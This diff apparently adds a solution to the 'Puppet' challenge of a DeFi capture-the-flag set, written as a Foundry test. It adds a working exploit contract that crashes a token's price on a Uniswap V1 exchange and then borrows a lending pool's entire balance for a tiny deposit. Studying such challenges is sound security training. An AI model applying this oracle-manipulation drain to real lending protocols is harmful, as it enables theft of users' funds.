@@ -92,7 +92,10 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        address exploitAddress = vm.computeCreateAddress(player, vm.getNonce(player));
+        token.transfer(exploitAddress, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        new PuppetExploit{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +118,23 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract PuppetExploit {
+    constructor(
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapV1Exchange uniswapV1Exchange,
+        address recovery
+    ) payable {
+        uint256 playerTokenBalance = token.balanceOf(address(this));
+        token.approve(address(uniswapV1Exchange), playerTokenBalance);
+        uniswapV1Exchange.tokenToEthSwapInput(playerTokenBalance, 1, block.timestamp);
+
+        uint256 amountToBorrow = token.balanceOf(address(lendingPool));
+        uint256 depositRequired = lendingPool.calculateDepositRequired(amountToBorrow);
+        lendingPool.borrow{value: depositRequired}(amountToBorrow, recovery);
+    }
+
+    receive() external payable {}
 }
